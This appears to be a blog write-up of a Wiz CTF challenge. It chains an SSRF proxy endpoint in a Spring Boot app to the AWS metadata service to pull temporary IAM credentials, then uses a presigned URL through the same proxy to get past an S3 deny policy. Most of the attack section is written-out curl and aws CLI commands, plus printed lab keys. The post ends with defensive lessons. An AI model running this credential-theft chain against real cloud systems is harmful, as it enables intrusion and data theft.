---
layout: post
title: "Wiz CTF June 2025: SSRF & AWS Credential Escalation"
date: 2025-07-10
categories: [ctf, security]
tags: [ctf, security, ssrf, aws, cloud-security, pentesting]
excerpt: "Exploiting Server-Side Request Forgery (SSRF) through Spring Boot Actuator to access AWS services, bypass data perimeter controls, and extract protected files using presigned URLs."
---

## Challenge Overview

In this Wiz CTF challenge, I exploited a Server-Side Request Forgery (SSRF) vulnerability via the `/proxy?url=` endpoint in a Spring Boot Actuator application. This allowed me to make internal requests to AWS services, access the Instance Metadata Service (IMDSv2), and ultimately bypass a data perimeter to retrieve a protected flag.

## Vulnerability Exploited

**Server-Side Request Forgery (SSRF)** combined with:
- AWS Instance Metadata Service (IMDSv2) access
- Misconfigured S3 bucket policies
- Presigned URL generation

## Attack Steps

### 1. Endpoint Discovery

First, I mapped the available endpoints using Spring Boot Actuator:

```bash
curl -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator/mappings
```

This revealed the vulnerable `/proxy` endpoint:
```json
"patterns": [ "/proxy" ],
"params": [ { "name": "url" } ],
"handler": "challenge.Application#proxy(String)"
```

### 2. AWS Metadata Access

Next, I exploited the SSRF to access the AWS Instance Metadata Service:

```bash
# Get metadata token
curl -u ctf:88sPVWyC2P3p \
  -X PUT \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

```bash
# Retrieve IAM role name
curl -u ctf:88sPVWyC2P3p \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: AQAEABCrJRHxImsxH1JVhUFrWPUuZSFBVBq6ShBgOv8IpfjYeeNY1g=="
```

Result: `challenge01-5592368`

### 3. AWS Credentials Extraction

Using the role name, I extracted temporary AWS credentials:

```bash
curl -u ctf:88sPVWyC2P3p \
  "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" \
  -H "X-aws-ec2-metadata-token: AQAEABCrJRHxImsxH1JVhUFrWPUuZSFBVBq6ShBgOv8IpfjYeeNY1g=="
```

This returned temporary AWS credentials including:
- Access Key ID: `ASIARK7LBOHXDFXXHGYE`
- Secret Access Key: `HtRUNKtijoKBAcec9fi0d5JGD8OG2fnjLG4lYSnp`
- Session Token: `[truncated for brevity]`

### 4. S3 Bucket Exploration

With the credentials, I explored the S3 bucket:

```bash
aws s3 ls s3://challenge01-470f711 --profile temp-creds
# Result: PRE private/ and hello.txt

aws s3 ls s3://challenge01-470f711/private/ --profile temp-creds
# Result: flag.txt
```

### 5. Bypass Attempt #1: Direct Access (Failed)

Direct access to the flag was blocked by bucket policy:

```bash
aws s3 cp s3://challenge01-470f711/private/flag.txt ./ --profile temp-creds
# Result: fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

### 6. Bypass Technique: Presigned URL + SSRF

I generated a presigned URL for the protected file:

```bash
aws s3 presign s3://challenge01-470f711/private/flag.txt --profile temp-creds
```

Then used the SSRF vulnerability to access the presigned URL through the vulnerable proxy endpoint:

```bash
curl -u ctf:88sPVWyC2P3p \
  "https://challenge01.cloud-champions.com/proxy?url=https%3A%2F%2Fchallenge01-470f711.s3.amazonaws.com%2Fprivate%2Fflag.txt%3F[URL-encoded-presigned-parameters]"
```

## Key Takeaways

This challenge demonstrated a sophisticated attack chain combining:

1. **SSRF Discovery**: Finding the vulnerable proxy endpoint through actuator mappings
2. **Cloud Metadata Abuse**: Leveraging IMDSv2 to extract AWS credentials
3. **Policy Bypass**: Using presigned URLs to circumvent bucket-level deny policies
4. **Request Routing**: Using the original SSRF vulnerability to make the presigned request appear to come from the authorized backend server

The attack succeeded because:
- The proxy endpoint had no URL filtering
- IMDSv2 was accessible from the application
- The S3 bucket policy only denied direct external access, not requests from the backend server
- Presigned URLs were generated with the backend's legitimate credentials

This highlights the importance of:
- Strict input validation on proxy endpoints
- Proper IMDSv2 security configurations
- Comprehensive S3 bucket policies that account for different attack vectors
- Network segmentation and least privilege access controls